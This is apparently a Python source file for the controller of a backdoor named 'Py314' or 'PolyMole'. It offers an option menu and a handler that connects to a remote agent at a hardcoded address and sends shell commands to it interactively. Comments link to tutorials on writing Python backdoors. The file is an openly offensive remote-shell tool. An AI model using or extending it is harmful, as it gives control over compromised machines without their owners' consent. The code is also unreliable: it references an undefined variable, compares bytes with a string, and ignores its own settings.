import sys
import glob
import socket
import threading
from cmd import Cmd
from os import system
from netaddr import ip
from termcolor import colored
from prettytable import PrettyTable


class Prompt(Cmd):
    """Simple Py314 Bind TCP handler"""


    optionsDict = {
        'rhost': '',
        'rport': 1234,
        'proxy': '', 
        'verbose': False
    }

    def do_bg(self, arg):
        """Return to Py314 main interpreter"""
        return True

    def do_exit(self, arg):
        """Quit Py314"""
        exit()

    def do_set(self, arg):
        """Set value for available option : set <option> <value>"""

        availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
        
        option = arg.split(' ')[0]
        value = arg.split(' ')[1]

        if option not in availableOptions:
            print(f"[!] Option {option} can't be set with this handler")
        else:
            self.optionsDict[option] = value

    def set_rhost(self):
        """Define remote IP of Py314 agent to bind"""

    def set_rport(self):
        """Define remote port of Py314 agent to bind"""

    def set_proxy(self):
        """Define a proxy, which be use to bind Py314 agent : <type>:<ip>:<port>"""

    def set_verbose(self):
        """Enable verbosity of bind_agent handler (default : False)"""
        self.optionsDict['verbose'] = arg


    def do_settings(self, arg):
        """Show currents settings of handler"""

        print("""\nThe bind_tcp handler is designed to bind a specified host with IP & port combination.""")
        print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed\n""")

        table = PrettyTable()
        headers = ['name', 'value', 'description']
        table.field_names = headers
        for header in headers:
            table.align[header] = 'l'

        for option in dir(self):
            if option.startswith('set_'):
                optionName = option.replace('set_', '')
                optionValue = self.optionsDict[optionName]
                optionDoc = getattr(self, option).__doc__

                table.add_row([optionName, optionValue, optionDoc])

        print(table)



        

def startModule():

    
    subPrompt = Prompt()
    subPrompt.prompt = f"({colored('bind_agent', 'yellow')}) > "
    subPrompt.cmdloop()


def sendCommand(channel):

    bufferSize = 1024

    try:

        while True:

            command = input(f"shell > ").encode()
            # If user want to clean console
            if command == 'clear':
                system('clear')
            else:
                channel.sendall(command)
                while True:
                    rawResponse = channel.recv(bufferSize)
                    if len(rawResponse) < bufferSize:
                        break

                shellReponse = rawResponse.decode()
                print(shellReponse)

    except ConnectionResetError:
        print(f"\n[-] Channel reset by peer")
        return

    except BrokenPipeError:
        print(f"\n[-] Channel reset by peer (broken pipe)")
        return

    except KeyboardInterrupt:
        print("Dans sendCommand")
        choice = input('Do you want to quit PolyMoly channel [y/n] ? :')

        if choice.lower() == 'y':
            print("\nquitting PolyMole")
            channel.close()
            return
        elif choice.lower() == 'n':
            pass






def launchModule():


    
    host = '192.168.1.1'
    port = 1234




    try:
    
        print(f"[+] Trying to connect to {host}:{port}")

        channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        channel.connect((host, port))
        print(f"[+] Connection established to {host}:{port}")


        t = threading.Thread(target=sendCommand, daemon=True, args=((channel,)))
        t.start()

        t.join()
        channel.close()
        

    except KeyboardInterrupt:
        print("Dans launchModule")
        choice = input('Do you want to quit PolyMoly channel [y/n] ? :')

        if choice.lower() == 'y':
            print("\nquitting PolyMole")
            channel.close()
            return
        elif choice.lower() == 'n':
            pass

    except ConnectionError:
        print(f"[!] Can't established connection to {host}")
        return

    except ConnectionRefusedError as e:
        print(e)
        return

    except OSError as error:
        print(f"[!] {error}")
        return

    # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
    # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
    # https://dev.to/tman540/simple-remote-backdoor-with-python-33a0
